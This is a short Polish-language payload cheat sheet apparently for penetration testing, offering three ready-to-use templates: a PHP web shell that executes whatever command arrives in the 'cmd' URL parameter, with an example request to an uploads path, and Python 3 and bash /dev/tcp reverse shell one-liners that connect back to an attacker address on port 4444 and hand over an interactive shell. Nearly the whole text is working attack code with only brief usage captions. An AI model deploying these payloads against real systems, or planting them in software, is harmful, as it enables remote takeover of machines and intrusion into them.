

### Szablon 1: Prosty PHP Web Shell (do testów przesyłania plików)


PHP

```
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Brak parametru cmd!";
}
?>
```

_Użycie w przeglądarce lub przez curl:_

Plaintext

```
http://<TARGET_IP>/uploads/shell.php?cmd=id
```

### Szablon 2: Python Reverse Shell (dla systemów z Pythonem 3)

_Wysyłany przez powłokę systemową lub web shell_

Python

```
python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<ATTACKER_IP>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")'
```

### Szablon 3: Netcat / Bash Reverse Shell (klasyczny one-liner)

_Wysyłany z poziomu systemu docelowego (np. przez web shell)_

Bash

```
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```